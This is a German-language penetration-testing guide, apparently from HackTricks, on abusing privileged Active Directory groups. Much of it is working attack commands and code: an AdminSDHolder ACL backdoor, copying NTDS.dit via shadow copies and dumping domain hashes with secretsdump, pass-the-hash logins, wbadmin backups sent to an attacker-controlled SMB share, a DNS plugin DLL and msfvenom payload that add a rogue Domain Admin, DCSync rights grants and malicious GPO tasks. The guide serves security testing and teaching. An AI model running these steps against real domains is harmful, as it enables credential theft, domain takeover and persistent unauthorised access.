# Privilegierte Gruppen

{{#include ../../banners/hacktricks-training.md}}

## Bekannte Gruppen mit Administrationsrechten

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Diese Gruppe ist berechtigt, Konten und Gruppen zu erstellen, die keine Administratoren der Domäne sind. Außerdem ermöglicht sie die lokale Anmeldung am Domain Controller (DC).

Um die Mitglieder dieser Gruppe zu ermitteln, wird der folgende Befehl ausgeführt:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung am DC.<sup>[[1]](#references)</sup>

Ein bedingter Pfad von der Kontoverwaltung zum lokalen Administratorzugriff führt über eine **normale Gruppe, die berechtigt ist, das LAPS-Passwort eines Computers auszulesen**. Prüfe die effektiven Berechtigungen zum Ändern der Mitgliedschaft in genau dieser Gruppe, ob sie geschützt ist und ob ein neues oder kontrolliertes Konto tatsächlich Mitglied werden kann. Aktualisiere das Token des Kontos, bevor du die LAPS-Leseberechtigung auf dem Zielcomputer testest. Bei verschlüsseltem Windows LAPS sind Leseberechtigung im Verzeichnis und Berechtigung zum Entschlüsseln des Passworts separate Voraussetzungen; die Gruppenmitgliedschaft oder die Mitgliedschaft in Account Operators allein gewährt keine davon. Siehe den [Geltungsbereich von Account Operators bei Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) und die [Delegierung von Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle „geschützten Gruppen“ in Active Directory festlegt, einschließlich Gruppen mit hohen Berechtigungen. Dieser Mechanismus schützt diese Gruppen, indem er nicht autorisierte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer Vollzugriff gewährt. Dadurch hätte dieser Benutzer effektiv die volle Kontrolle über alle geschützten Gruppen. Werden die Berechtigungen dieses Benutzers geändert oder entfernt, werden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.<sup>[[14]](#references)</sup>

Aktuelle Windows-Server-Dokumentation führt weiterhin mehrere integrierte Operator-Gruppen als **geschützte** Objekte auf (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` usw.). Der Prozess **SDProp** wird standardmäßig alle 60 Minuten auf dem **PDC Emulator** ausgeführt, setzt `adminCount=1` und deaktiviert die Vererbung für geschützte Objekte. Das ist sowohl für Persistenz als auch für die Suche nach veralteten privilegierten Benutzern nützlich, die aus einer geschützten Gruppe entfernt wurden, aber weiterhin die ACL ohne Vererbung behalten.<sup>[[12]](#references)</sup>

Befehle zum Überprüfen der Mitglieder und Ändern der Berechtigungen sind:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Ein Skript beschleunigt den Wiederherstellungsprozess: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Weitere Details finden Sie bei [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD-Papierkorb

Welche gelöschten Objekte sichtbar sind, hängt von den tatsächlich wirksamen Verzeichnisberechtigungen ab; ein Gruppenname allein beweist nicht, dass die aktuelle Identität ein Objekt auflisten oder wiederherstellen kann. Für eine vollständige Wiederherstellung muss der AD-Papierkorb bereits vor dem Löschen aktiviert gewesen sein. Außerdem erfordert eine Wiederherstellung das Recht Reanimate-Tombstones auf dem Stamm des Namenskontexts, Umbenennungsrechte und CREATE_CHILD für den Zielcontainer. [Microsofts Anleitung zum Papierkorb](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) und die [Autorisierungsregeln für das Wiederherstellen gelöschter Objekte](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) unterscheiden diese Voraussetzungen. Eine autorisierte Identität mit Lesezugriff auf gelöschte Objekte kann Datensätze einsehen, die vertrauliche Informationen offenlegen können:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Dies ist nützlich, um **frühere Privilegienpfade wiederherzustellen**. Gelöschte Objekte können weiterhin `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, alte SPNs oder den DN einer gelöschten privilegierten Gruppe offenlegen, die später von einem anderen Operator wiederhergestellt werden kann.

Anwendungsspezifische Attribute können ebenfalls alte Zugangsdaten enthalten, solange sich ein Objekt im gelöschten Zustand befindet. Betrachte dies als separaten Ansatzpunkt für die Prüfung: Die aktuelle Identität muss das gelöschte Objekt **aufzählen** und dieses Attribut **lesen** dürfen, der Wert muss als Zugangsdaten verwendbar sein und ein noch aktiver Principal muss ihn akzeptieren. Gruppenmitgliedschaft oder der Name eines gelöschten Kontos allein belegen keinen dieser Schritte; gib bei der routinemäßigen Aufzählung keine Zugangsdaten aus. Die [Dokumentation von Microsoft zu Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) beschreibt die Beibehaltung von Attributen nach dem Löschen.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Zugriff auf den Domain Controller

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, sofern der Benutzer nicht Mitglied der Gruppe `Server Operators` ist, wodurch sich die Zugriffsebene ändert.

### Privilegieneskalation

Mit `PsService` oder `sc` von Sysinternals lassen sich Dienstberechtigungen überprüfen und ändern. Die Gruppe `Server Operators` hat beispielsweise Vollzugriff auf bestimmte Dienste und kann dadurch beliebige Befehle ausführen und eine Privilegieneskalation erreichen:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben und dadurch Dienste manipulieren können, um erhöhte Berechtigungen zu erlangen.

## Backup Operators

Die Mitgliedschaft in `Backup Operators` kann einem Host je nach lokaler Richtlinie und Anmeldesitzung `SeBackupPrivilege` und `SeRestorePrivilege` gewähren. Prüfen Sie das **effektive Token des Prozesses, der die Befehle ausführt**, mit `whoami /groups` und `whoami /priv`: Die Mitgliedschaft allein beweist nicht, dass `SeBackupPrivilege` vorhanden und aktiviert ist. Ist das Privileg vorhanden, aber deaktiviert, kann es in diesem Token möglicherweise aktiviert werden; fehlt es oder wurde es entfernt, können diese Backup-Operationen es nicht nutzen. `SeBackupPrivilege` ermöglicht geschützte **Lesezugriffe** über Backup-fähige APIs (z. B. `FILE_FLAG_BACKUP_SEMANTICS` oder `robocopy /B`); `SeRestorePrivilege` ist ein separates Privileg für Wiederherstellungs-/Schreibvorgänge. Gewöhnliche Verzeichnisauflistungen und Kopiervorgänge verwenden nicht unbedingt Backup-Semantik.<sup>[[1]](#references)</sup>

Um die Gruppenmitglieder aufzulisten, führen Sie Folgendes aus:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Lokaler Angriff

Auf einem Host, auf dem das effektive Token über `SeBackupPrivilege` verfügt, kann die folgende backup-bewusste Kopie eine geschützte Datei lesen:

1. Notwendige Bibliotheken importieren:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Wenn das Privileg vorhanden, aber deaktiviert ist, aktivieren Sie es und überprüfen Sie seinen Status in diesem Prozess:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Kopiere eine Datei aus einem eingeschränkten Verzeichnis, zum Beispiel:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` ist die Active-Directory-Datenbank auf einem **domain controller (DC)**. Dieser Weg erfordert ein geeignetes Token auf dem DC und Zugriff auf das Volume, das die Datenbank enthält; die Mitgliedschaft in der Gruppe Backup Operators an anderer Stelle gewährt keinen Zugriff auf einen bestimmten DC. Eine aktive Datenbank ist normalerweise gesperrt. Verwende daher vor dem Kopieren eine zugängliche Shadow Copy oder eine andere Backup-Funktion. Das Erstellen oder Bereitstellen einer Shadow Copy hängt außerdem von der VSS-Konfiguration des Hosts und den Rechten des Aufrufers ab. Das folgende Beispiel setzt voraus, dass der DC `NTDS.dit` auf `C:` unter `\Windows\NTDS` speichert. Passe Volume und Pfad an, falls dies nicht der Fall ist.

#### Using diskshadow.exe

1. Falls zulässig, erstelle eine Shadow Copy des Laufwerks `C:` des DC und stelle sie als `F:` bereit:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. `NTDS.dit` aus der Schattenkopie kopieren:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternativ kannst du `robocopy` zum Kopieren von Dateien verwenden:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Speichere die `SYSTEM`-Hive des DC zur Offline-Extraktion. `SAM` ist auf Mitgliedssystemen die lokale Kontendatenbank; die `SAM`-Hive eines DC ist kein Ersatz für `NTDS.dit` und keine Quelle für den Hash des Domänenadministrators:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Übertrage `ntds.dit` und `SYSTEM.SAV` auf den Analysehost und extrahiere die Hashes der Domänenkonten. Ein gespeicherter `SAM`-Hive eines Membersystems liefert zusammen mit dem passenden `SYSTEM`-Hive stattdessen lokale Account-Hashes:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Wenn ein Hash eines **Domänenadministrators** aus `NTDS.dit` wiederhergestellt wurde, kann er für die Domänenauthentifizierung getestet werden. Ein lokaler Administrator-Hash aus `SAM.SAV` ist ein anderes Anmeldedatum und authentifiziert nicht als Domänenadministrator.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Mit wbadmin.exe

1. Richten Sie auf dem Angreifercomputer ein NTFS-Dateisystem für den SMB-Server ein und speichern Sie die SMB-Anmeldedaten auf dem Zielcomputer zwischen.
2. Verwenden Sie `wbadmin.exe` für die Systemsicherung und die Extraktion von `NTDS.dit`.
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Eine praktische Demonstration findest du im [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der Gruppe **DnsAdmins** können ihre Berechtigungen ausnutzen, um eine beliebige DLL mit SYSTEM-Rechten auf einem DNS-Server zu laden, der häufig auf Domain Controllern gehostet wird. Diese Möglichkeit bietet erhebliches Exploit-Potenzial.

Um die Mitglieder der Gruppe DnsAdmins aufzulisten, verwende:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Beliebige DLL ausführen (CVE‑2021‑40469)

> [!NOTE]
> Diese Sicherheitslücke ermöglicht die Ausführung beliebigen Codes mit SYSTEM-Berechtigungen im DNS-Dienst (normalerweise auf den DCs). Das Problem wurde 2021 behoben.

Mitglieder können den DNS-Server mithilfe von Befehlen wie den folgenden dazu bringen, eine beliebige DLL zu laden (entweder lokal oder von einer Remote-Freigabe):

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Ein Neustart des DNS-Dienstes (für den möglicherweise zusätzliche Berechtigungen erforderlich sind) ist notwendig, damit die DLL geladen wird:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Weitere Details zu diesem Angriffsvektor finden Sie bei ired.team.

#### Mimilib.dll

Es ist auch möglich, mimilib.dll zur Befehlsausführung zu verwenden, indem man sie so modifiziert, dass sie bestimmte Befehle oder Reverse Shells ausführt. [In diesem Beitrag finden Sie](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) weitere Informationen.<sup>[[15]](#references)</sup>

### WPAD-Eintrag für MitM

DnsAdmins können DNS-Einträge manipulieren, um Man-in-the-Middle-Angriffe (MitM) durchzuführen, indem sie nach dem Deaktivieren der globalen Abfrageliste einen WPAD-Eintrag erstellen. Tools wie Responder oder Inveigh können zum Spoofing und Abfangen des Netzwerkverkehrs verwendet werden.

### Event Log Readers
Mitglieder können auf Ereignisprotokolle zugreifen und dort möglicherweise sensible Informationen wie Klartextpasswörter oder Details zur Befehlsausführung finden:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Diese Gruppe kann DACLs für das Domänenobjekt ändern und sich dadurch möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Rechteausweitung, die diese Gruppe ausnutzen, werden im GitHub-Repo Exchange-AD-Privesc ausführlich beschrieben.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Wenn du als Mitglied dieser Gruppe agieren kannst, besteht der klassische Missbrauch darin, einem vom Angreifer kontrollierten Principal die für [DCSync](dcsync.md) erforderlichen Replikationsrechte zu gewähren:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historisch verknüpfte **PrivExchange** den Zugriff auf Postfächer, erzwungene Exchange-Authentifizierung und LDAP relay, um dieselbe Primitive zu erlangen. Selbst wenn dieser Relay-Pfad mitigiert ist, bleibt die direkte Mitgliedschaft in `Exchange Windows Permissions` oder die Kontrolle über einen Exchange-Server ein hochwertiger Weg zu Replikationsrechten für die Domäne.

## Hyper-V-Administratoren

Hyper-V-Administratoren haben uneingeschränkten Zugriff auf Hyper-V. Dieser lässt sich ausnutzen, um die Kontrolle über virtualisierte Domain Controller zu erlangen. Dazu gehört, laufende DCs zu klonen und NTLM-Hashes aus der Datei `NTDS.dit` zu extrahieren.

### Exploit-Beispiel

In der Praxis geht es meist um **Offline-Zugriff auf DC-Datenträger/Checkpoints** statt um veraltete LPE-Tricks auf Host-Ebene. Mit Zugriff auf den Hyper-V-Host kann ein Operator einen Checkpoint eines virtualisierten Domain Controllers erstellen oder ihn exportieren, die VHDX einbinden und `NTDS.dit`, `SYSTEM` sowie weitere Geheimnisse extrahieren, ohne LSASS im Gastbetriebssystem anzufassen:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Von dort aus kannst du den `Backup Operators`-Workflow wiederverwenden, um `Windows\NTDS\ntds.dit` und die Registry-Hives offline zu kopieren. Zugehöriger Workflow für Backup-Dateien:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Diese Gruppe erlaubt ihren Mitgliedern, Gruppenrichtlinien in der Domäne zu erstellen. Ihre Mitglieder können Gruppenrichtlinien jedoch weder auf Benutzer oder Gruppen anwenden noch bestehende GPOs bearbeiten.

Wichtig ist, dass **der Ersteller zum Besitzer der neuen GPO wird** und anschließend in der Regel ausreichend Rechte erhält, um sie zu bearbeiten. Daher ist diese Gruppe interessant, wenn du entweder:

- eine bösartige GPO erstellen und einen Administrator davon überzeugen kannst, sie mit einer Ziel-OU oder -Domäne zu verknüpfen
- eine von dir erstellte GPO bearbeiten kannst, die bereits an einer geeigneten Stelle verknüpft ist
- ein anderes delegiertes Recht missbrauchen kannst, mit dem du GPOs verknüpfst, während dir diese Gruppe die nötigen Bearbeitungsrechte gibt

Ein praktischer Missbrauch besteht normalerweise darin, über SYSVOL-gestützte Richtliniendateien eine Änderung an einer **Immediate Task**, einem **startup script**, der **local admin membership** oder einer **user rights assignment** vorzunehmen.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Wenn du die GPO manuell über `SYSVOL` bearbeitest, beachte, dass die Änderung allein nicht ausreicht: `versionNumber`, `GPT.ini` und manchmal auch `gPCMachineExtensionNames` müssen aktualisiert werden, sonst ignorieren Clients die Richtlinienaktualisierung.<sup>[[9]](#references)</sup>

## Organization Management

In Umgebungen, in denen **Microsoft Exchange** eingesetzt wird, verfügt eine spezielle Gruppe namens **Organization Management** über umfangreiche Berechtigungen. Diese Gruppe ist privilegiert und kann **auf die Postfächer aller Domänenbenutzer zugreifen**. Außerdem hat sie **uneingeschränkte Kontrolle über die Organisationseinheit (OU) „Microsoft Exchange Security Groups“**. Dazu gehört auch die Gruppe **`Exchange Windows Permissions`**, die für eine Rechteausweitung ausgenutzt werden kann.

### Ausnutzung von Berechtigungen und Befehle

#### Print Operators

Mitglieder der Gruppe **Print Operators** verfügen über mehrere Berechtigungen, darunter **`SeLoadDriverPrivilege`**, mit der sie sich **lokal an einem Domain Controller anmelden**, diesen herunterfahren und Drucker verwalten können. Um diese Berechtigungen auszunutzen, ist es erforderlich, die Benutzerkontensteuerung (UAC) zu umgehen – insbesondere, wenn **`SeLoadDriverPrivilege`** in einem nicht erhöhten Kontext nicht sichtbar ist.<sup>[[1]](#references)</sup>

Um die Mitglieder dieser Gruppe aufzulisten, wird folgender PowerShell-Befehl verwendet:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Auf Domänencontrollern ist diese Gruppe gefährlich, weil die Standardrichtlinie für Domänencontroller `SeLoadDriverPrivilege` für **`Print Operators`** gewährt. Wenn du ein erhöhtes Token für ein Mitglied dieser Gruppe erlangst, kannst du das Privileg aktivieren und einen signierten, aber verwundbaren Treiber laden, um zu Kernel/SYSTEM zu wechseln.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Details zur Token-Verarbeitung findest du unter [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Mitglieder dieser Gruppe erhalten über das Remote Desktop Protocol (RDP) Zugriff auf PCs. Zum Auflisten dieser Mitglieder stehen PowerShell-Befehle zur Verfügung:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Weitere Einblicke in die Ausnutzung von RDP finden sich in speziellen Pentesting-Ressourcen.

#### Remote Management Users

Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Diese Mitglieder lassen sich wie folgt ermitteln:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Für Exploitation-Techniken im Zusammenhang mit **WinRM** sollte die entsprechende Dokumentation konsultiert werden.

#### Server Operators

Diese Gruppe verfügt über Berechtigungen, um verschiedene Konfigurationen auf Domain Controllern vorzunehmen, darunter Sicherungs- und Wiederherstellungsrechte, das Ändern der Systemzeit und das Herunterfahren des Systems.<sup>[[1]](#references)</sup> Zum Auflisten der Mitglieder wird folgender Befehl angegeben:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Auf Domain Controllern erben `Server Operators` üblicherweise genügend Rechte, um **Dienste neu zu konfigurieren oder zu starten/stoppen**, und erhalten über die standardmäßige DC-Richtlinie außerdem `SeBackupPrivilege`/`SeRestorePrivilege`. In der Praxis bilden sie damit eine Brücke zwischen dem **Missbrauch der Dienststeuerung** und der **NTDS-Extraktion**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Das Fehlschlagen beim Auflisten von Diensten schließt den Zugriff auf einen **bekannten Dienst** nicht aus. Der Service Control Manager prüft `SC_MANAGER_ENUMERATE_SERVICE` für das Auflisten getrennt von `SC_MANAGER_CONNECT`; beim Öffnen eines benannten Dienstes werden dessen eigene Rechte geprüft, einschließlich `SERVICE_CHANGE_CONFIG` und `SERVICE_START`. Prüfe das effektive Token und die ACL des jeweiligen Dienstes auch dann, wenn ein allgemeines `sc.exe query` fehlschlägt. Konfigurationsrechte allein sind nur ein möglicher Ansatzpunkt: Die Dienstidentität, Start-/Stopprechte und ein nutzbarer Trigger bestimmen weiterhin, ob ein Übergang zu höheren Privilegien möglich ist. Siehe die [Referenz zu Dienstzugriffsrechten von Microsoft](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Wenn eine Dienst-ACL dieser Gruppe Änderungs- und Startrechte gewährt, setze den Dienst auf einen beliebigen Befehl, starte ihn als `LocalSystem` und stelle anschließend den ursprünglichen `binPath` wieder her. Wenn die Dienststeuerung eingeschränkt ist, weiche auf die obigen `Backup Operators`-Techniken aus, um `NTDS.dit` zu kopieren.

## References

- [1] [ired.team – Privilegierte Konten und Token-Privilegien](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Missbrauch von SeLoadDriverPrivilege zur Rechteausweitung](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Missbrauch von GPO-Berechtigungen](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO-Missbrauch, Teil 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Leitfaden eines Red Teamers zu GPOs und OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funktion ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymes LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Anhang C: Geschützte Konten und Gruppen in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Missbrauch und Backdoor-Einrichtung von AdminSDHolder, um Domain-Admin-Persistenz zu erlangen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Missbrauch des DnsAdmins-Privilegs zur Rechteausweitung in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informationen zum Missbrauch der GenericAll-Kante](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funktion NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
